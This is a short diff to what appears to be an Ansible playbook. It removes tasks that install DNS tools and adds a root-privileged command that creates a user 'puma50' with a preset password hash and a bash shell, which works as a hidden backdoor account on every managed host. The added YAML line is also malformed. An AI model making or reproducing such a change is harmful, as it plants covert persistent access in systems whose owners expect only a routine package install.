@@ -3,9 +3,4 @@
   gather_facts: true
   become: true
   tasks:
-    - yum:
-        name: bind-utils
-      when: ansible_os_family == "RedHat"
-    - apt:
-        name: dnsutils
-      when: ansible_os_family == "Debian"
+    command: /usr/sbin/useradd -m -p $6$JXfS/FpfxMV8pBWA$TCO4fdP/cLZxrSUoFB6lvgERyF9UwTb289t5WFhRFi.10z1nL6fmq1sWkGVJTj/ShnBhhpaKGrdQn6aZlYLuG1 -s /bin/bash puma50
